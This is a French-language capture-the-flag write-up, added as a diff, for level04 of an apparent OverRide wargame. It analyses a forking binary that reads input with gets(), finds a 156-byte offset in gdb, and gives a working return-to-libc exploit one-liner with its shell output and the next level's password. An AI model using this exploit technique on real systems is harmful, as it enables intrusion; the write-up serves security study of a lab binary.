@@ -1,0 +1,62 @@
+    __               ______  __ __
+   / /__ _   _____  / / __ \/ // /
+  / / _ \ | / / _ \/ / / / / // /_
+ / /  __/ |/ /  __/ / /_/ /__  __/
+/_/\___/|___/\___/_/\____/  /_/   
+                                  
+                                  
+
+>$ objdump -d
+
+On constate la présence du <main>, que nous allons étudier ici :
+
+La particularité ici s'exprime via un appel à la fonction fork, nous aurons deux programme : PARENT & CHILD
+
+Dans le processus CHILD on observe :
+
+  1) L'initialisation d'un espace mémoire str [0x20(esp)]
+  2) La combinaison d'appel aux fonctions prctl() et ptrace() permet de quitter le processus CHILD si PARENT vient à s'arreter
+  3) Récupère via la fonction gets() notre input stocké dans str
+  4) Le programme return()
+  
+Dans le processus PARENT on observe :
+
+  1) L'initialisation d'un espace mémoire str [0x20(esp)]
+  2) L'appel à la fonction wait() qui met en pause le processus jusqu'a la suppression, modification, arrêt du processus CHILD
+  3) Un appel à ptrace() permet de verifier la valeur du syscall, ce qui nous empêche d'utiliser exec()
+
+Exploit :
+
+"N'utilisez jamais gets(). Comme il est impossible de savoir à l'avance combien de caractères seront lus par gets(), et comme celui-ci écrira tous les 
+ caractères lus, même s'ils débordent du tampon, cette fonction est extrèmement dangereuse à utiliser"
+ 
+ Nous devons determiner l'offset afin de pouvoir réécrire l'eip.
+ 
+"By default, when a program forks, GDB will continue to debug the parent process and the child process will run unimpeded. If you want to follow the child 
+ process instead of the parent process, use the command set follow-fork-mode"
+ 
+ Nous allons utiliser "set follow-fork-mode child" dans puis "https://wiremask.eu/tools/buffer-overflow-pattern-generator/?" pour determiner l'offset. Ainsi, on
+ trouve un offset de 156.
+ 
+ Procédons à la réalisation d'un return2libc :
+ 
+ (gdb) p system                           => 0xf7e6aed0
+ (gdb) find &system,+9999999,"/bin/sh"    => 0xf7f897ec
+ (gdb) p exit                             => 0xf7e5eb70
+ 
+ 
+>$ level04@OverRide:~$ (python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
+   Give me some shellcode, k
+   whoami
+   level05
+   cat /home/users/level05/.pass
+   3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+ 
+
+Next ...
+ 
+ 
+ 
+ 
+ 
+ 
